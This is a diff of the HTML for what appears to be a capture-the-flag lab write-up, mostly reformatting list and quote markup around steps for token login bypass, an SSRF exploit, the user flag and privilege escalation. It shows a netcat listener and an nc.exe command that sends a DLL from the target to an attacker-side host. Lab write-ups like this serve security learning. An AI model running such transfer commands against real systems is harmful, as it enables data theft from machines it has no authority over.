@@ -108,31 +108,28 @@ A login interface, we don’t have those creds, but may trying using the token w
 <br /><br />
 Then we should get a success message and go yo IssuePrescription panel
 <br /><br />
-    <blockquote>
-      <p>Open a listening port using netcat</p>
+Open a listening port using netcat</li>
+</ol>
 
-      <p><br /><br />
+<p><br /><br />
 Exploit SSFR 
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_4.png" alt="Untitled" />
 <br /><br />
 User flag on c:\Users\svc_exampanel\Desktop&gt;type user.txt
 <br /><br /></p>
-      <h2 id="3-priv-esc">3: Priv esc</h2>
-      <p><br /><br /></p>
-      <ul>
-        <li>We found some dll’s on c:\inetpub\ExaminationPanel\ExaminationPanel\bin
+<h2 id="3-priv-esc">3: Priv esc</h2>
+<p><br /><br /></p>
+<ul>
+  <li>We found some dll’s on c:\inetpub\ExaminationPanel\ExaminationPanel\bin
 <br /><br /></li>
-        <li>There’s might be something interesting on ExaminationManagement.dll let’s move from here to c:\Users\svc_exampanel\Desktop because is there where we have permissions, use nc to download locally to reverse it.
+  <li>There’s might be something interesting on ExaminationManagement.dll let’s move from here to c:\Users\svc_exampanel\Desktop because is there where we have permissions, use nc to download locally to reverse it.
 <br /><br />
-          <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp4444</span> <span class="o">&gt;</span>  ExaminationManagement.dll
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp4444</span> <span class="o">&gt;</span>  ExaminationManagement.dll
 .<span class="se">\n</span>c.exe 10.10.14.000 4444 <span class="nt">-w</span> 3 &lt;  ExaminationManagement.dll
-</code></pre></div>          </div>
-        </li>
-      </ul>
-    </blockquote>
+</code></pre></div>    </div>
   </li>
-</ol>
+</ul>
 
 <p><br /><br /></p>
 <aside>
